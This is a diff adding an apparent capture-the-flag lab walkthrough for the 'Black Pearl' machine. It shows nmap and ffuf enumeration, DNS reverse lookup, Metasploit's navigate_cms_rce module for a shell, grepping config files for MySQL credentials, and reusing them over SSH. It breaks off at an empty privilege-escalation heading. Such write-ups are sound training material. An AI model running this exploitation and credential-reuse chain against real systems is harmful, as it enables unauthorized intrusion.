@@ -1,2 +1,94 @@
 # Black Pearl machine walkthrough
 Starting with nmap scan.
+
+## SCREENSHOT
+
+Ok, we have three ports open, 22, 53, 80 for ssh, dns, and http. Start with http and see what it has. Let's search for any usful directories.  
+
+```
+ffuf -u http://192.168.0.106/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ
+secret
+```
+Great, we got 'secret'. Let's see it.
+
+## SCREENSHOT
+
+Ok, we may have a potential username "Alek". Nothing else on this site. Let's move to port 53 which is dns.
+
+```
+sudo dnsrecon -r 127.0.0.0/24 -n 192.168.0.106
+```
+
+This command will look for internal sites inside dns server.
+
+## SCREENSHOT
+
+Yes, found something interesting 'blackpearl.tcm'. To access it, we need to add it to /etc/hosts like that.
+
+```
+192.168.0.106   blackpearl.tcm
+```
+
+Good, let's visit http://blackpearl.tcm
+
+## SCREENSHOT
+
+It is a php configuration page. Let's do some directory busting again, but on http://blackpearl.tcm this time.
+
+```
+ffuf -u http://blackpearl.tcm/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ
+navigate
+```
+Great, we got navigate. Let's see it.
+
+## SCREENSHOT
+
+I tried sql injection, but it didn't work. So, let's search online for any exploit for navigatecms, and i found that https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/
+Great, metasploit has exploit for it. Opening metasploit.
+
+```
+use exploit/multi/http/navigate_cms_rce
+set RHOSTS http://blackpearl.tcm
+exploit
+```
+
+## SCREENSHOT
+
+Great, we are in. We have user www-data. Let's discover the files of that site.
+
+## SCREENSHOT
+
+I want to search in all files for word "password" to see, if can find credentials.
+
+```
+grep  -r 'password*' navigate/*  --exclude='*.css' --exclude='*.js' --exclude-dir='lib' --exclude-dir='js' | cut -d: -f1
+```
+- -r  search in subdirectories
+- navigate/* all files inside navigate folder
+- --exclude  igonre files of spacific type
+- --exclude-dir ignore spacific directories from search
+
+This command will search in all files and dirs inside navigate folder except files of type .css and .js and dirs 'lib' and 'js'. I ignored these files becuase they are not useful.  
+
+## SCREENSHOT
+
+We have a lot of files that have 'password' inside. Exploring them, i found that navigate/cfg/globals.php has mysql credentials.
+
+```
+define('PDO_HOSTNAME', "localhost");
+define('PDO_PORT',     "3306");
+define('PDO_SOCKET',   "");
+define('PDO_DATABASE', "navigate");
+define('PDO_USERNAME', "alek");
+define('PDO_PASSWORD', "H4x0r");
+define('PDO_DRIVER',   "mysql");
+```
+Let's try to login to ssh using that credential.
+
+### SCREENSHOT
+
+Great, now we are alek.
+
+# Privilege Escalation
+
+
